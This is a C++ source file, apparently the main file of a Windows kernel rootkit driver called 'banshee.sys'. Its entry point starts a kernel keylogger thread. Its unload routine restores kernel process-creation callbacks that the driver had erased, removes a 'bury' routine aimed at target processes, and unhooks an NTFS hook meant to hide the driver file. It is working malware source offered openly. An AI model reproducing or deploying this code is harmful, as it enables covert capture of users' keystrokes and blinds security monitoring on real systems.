#include <ntifs.h>
#include <wdf.h>

#include "DriverMeta.hpp"
#include "Globals.hpp"
#include "IOCTLS.hpp"
#include "FileUtils.hpp"
#include "Keylogger.hpp"

// --------------------------------------------------------------------------------------------------------

// Features

// Deny file system  access to the banshee.sys file by hooking NTFS
#define DENY_DRIVER_FILE_ACCESS FALSE

// --------------------------------------------------------------------------------------------------------

HANDLE hKeyloggerThread;

/**
 * Called on unloading the driver.
 *
 * @param DriverObject Pointer to the DriverObject.
 * @return NTSTATUS status code.
 */
NTSTATUS
BeUnload(PDRIVER_OBJECT DriverObject)
{
    LOG_MSG("Unload Called \r\n");

    BeGlobals::shutdown = true;

    // Wait for keylogger to stop running TODO: proper signaling
    BeGlobals::logKeys = false;
    LARGE_INTEGER interval;
    interval.QuadPart = -1 * (LONGLONG)500 * 10000;
    KeDelayExecutionThread(KernelMode, FALSE, &interval);
    // Close thread handle
    ZwClose(hKeyloggerThread);

    // Restore kernel callbacks
    {
        {
            AutoLock<FastMutex> _lock(BeGlobals::callbackLock);

            LOG_MSG("Erased kernel callback amount: %i\n", BeGlobals::beCallbacksToRestore.length);
            while (BeGlobals::beCallbacksToRestore.length >= 0)
            {
                auto callbackToRestore = BeGlobals::beCallbacksToRestore.callbackToRestore[BeGlobals::beCallbacksToRestore.length];
                auto callbackAddr = BeGlobals::beCallbacksToRestore.addrOfCallbackFunction[BeGlobals::beCallbacksToRestore.length];
                auto callbackType = BeGlobals::beCallbacksToRestore.callbackType[BeGlobals::beCallbacksToRestore.length];

                if (callbackToRestore != NULL)
                {
                    LOG_MSG("Restoring kernel callback function -> callbackToRestore 0x%llx\n", callbackToRestore);
                    switch (callbackType)
                    {
                    case CreateProcessNotifyRoutine:
                        InterlockedExchange64((LONG64*)callbackAddr, callbackToRestore);
                        break;
                    default:
                        LOG_MSG("Invalid callback type\r\n");
                        return STATUS_INVALID_PARAMETER;
                        break;
                    }
                }
                BeGlobals::beCallbacksToRestore.length--;
            }
        }
    }

    // Remove our bury routine if we set one
    if(BeGlobals::beBuryTargetProcesses.length != 0)
    {
        if (BeGlobals::pPsSetCreateProcessNotifyRoutineEx(BeBury_ProcessNotifyRoutineEx, TRUE) == STATUS_SUCCESS)
        {
            LOG_MSG("Removed routine!\n");
        }
        else
        {
            LOG_MSG("Failed to remove routine!\n");
        }

        // free global memory for bury process wstrs
        { 
            AutoLock<FastMutex> _lock(BeGlobals::buryLock); 
            
            while (BeGlobals::beBuryTargetProcesses.length >= 0)
            {
                if (BeGlobals::beBuryTargetProcesses.array[BeGlobals::beBuryTargetProcesses.length] != NULL)
                {
                    ExFreePoolWithTag(BeGlobals::beBuryTargetProcesses.array[BeGlobals::beBuryTargetProcesses.length], DRIVER_TAG);
                    BeGlobals::beBuryTargetProcesses.array[BeGlobals::beBuryTargetProcesses.length] = NULL;
                }
                BeGlobals::beBuryTargetProcesses.length--;
            }
        } 
    }

    // Unhook if NTFS was hooked
    if (BeGlobals::originalNTFS_IRP_MJ_CREATE_function != NULL)
    {
        if (BeUnhookNTFSFileCreate() == STATUS_SUCCESS)
        {
            LOG_MSG("Removed NTFS hook!\n");
        }
        else
        {
            LOG_MSG("Failed to remove NTFS hook!\n");
        }
    }

    LOG_MSG("Byebye!\n");
        
    IoDeleteSymbolicLink(&usDosDeviceName);
    IoDeleteDevice(DriverObject->DeviceObject);
    return STATUS_SUCCESS;
}

/**
 * Called on closing the driver.
 *
 * @param DeviceObject Pointer to the DeviceObject.
 * @param Irp Pointer to the IO Request Packet (IRP)
 * @return NTSTATUS status code.
 */
NTSTATUS 
BeClose(PDEVICE_OBJECT pDeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(pDeviceObject);
    UNREFERENCED_PARAMETER(Irp);
    LOG_MSG("Close Called \r\n");
    return STATUS_SUCCESS;
}

/**
 * Called on driver creation.
 *
 * @param DeviceObject Pointer to the DeviceObject.
 * @param Irp Pointer to the IO Request Packet (IRP)
 * @return NTSTATUS status code.
 */
NTSTATUS 
BeCreate(PDEVICE_OBJECT pDeviceObject, PIRP Irp)
{
    UNREFERENCED_PARAMETER(pDeviceObject);
    UNREFERENCED_PARAMETER(Irp);
    LOG_MSG("Create Called \r\n");
    return STATUS_SUCCESS;
}

/**
 * Driver entrypoint (think main()).
 *
 * @param pDriverObject Pointer to the DriverObject.
 * @param pRegistryPath A pointer to a UNICODE_STRING structure that specifies the path to the driver's Parameters key in the registry.
 * @return NTSTATUS status code.
 */
extern "C"
NTSTATUS
DriverEntry(PDRIVER_OBJECT pDriverObject, PUNICODE_STRING pRegistryPath)
{
    UNREFERENCED_PARAMETER(pRegistryPath);
    LOG_MSG("DriverEntry Called \r\n");

    NTSTATUS NtStatus = STATUS_SUCCESS;
    PDEVICE_OBJECT pDeviceObject = NULL;

    NtStatus = IoCreateDevice(
        pDriverObject,
        0,
        &usDriverName,
        FILE_DEVICE_UNKNOWN, // not associated with any real device
        FILE_DEVICE_SECURE_OPEN,
        FALSE, 
        &pDeviceObject
    );

    if (pDeviceObject == NULL)
    {
        return NtStatus;
    }

    pDriverObject->DriverUnload = (PDRIVER_UNLOAD)BeUnload;

    // IRP Major Requests
    for (ULONG uiIndex = 0; uiIndex < IRP_MJ_MAXIMUM_FUNCTION; uiIndex++)
    {
        pDriverObject->MajorFunction[uiIndex] = (PDRIVER_DISPATCH)BeUnSupportedFunction;
    }
    pDriverObject->MajorFunction[IRP_MJ_CLOSE] = (PDRIVER_DISPATCH)BeClose;               // CloseHandle
    pDriverObject->MajorFunction[IRP_MJ_CREATE] = (PDRIVER_DISPATCH)BeCreate;             // CreateFile
    pDriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = (PDRIVER_DISPATCH)BeIoControl;  // DeviceIoControl
    
    NtStatus = BeGlobals::BeInitGlobals(pDriverObject);
    if (NtStatus != 0)
    {
        return NtStatus;
    }

    NtStatus = IoCreateSymbolicLink(&usDosDeviceName, &usDriverName); // Symbolic Link simply maps a DOS Device Name to an NT Device Name.
    if (NtStatus != 0)
    {
        return NtStatus;
    }

#if DENY_DRIVER_FILE_ACCESS
    NtStatus = BeHookNTFSFileCreate();
#endif

    // Start Keylogger Thread
    PKTHREAD ThreadObject;
    NtStatus = PsCreateSystemThread(&hKeyloggerThread, THREAD_ALL_ACCESS, NULL, NULL, NULL, BeKeyLoggerFunction, NULL);
    if (NtStatus != 0)
    {
        return NtStatus;
    }

    pDeviceObject->Flags |= DO_BUFFERED_IO;
    pDeviceObject->Flags &= ~DO_DEVICE_INITIALIZING; // finished initializing

    return NtStatus;
}
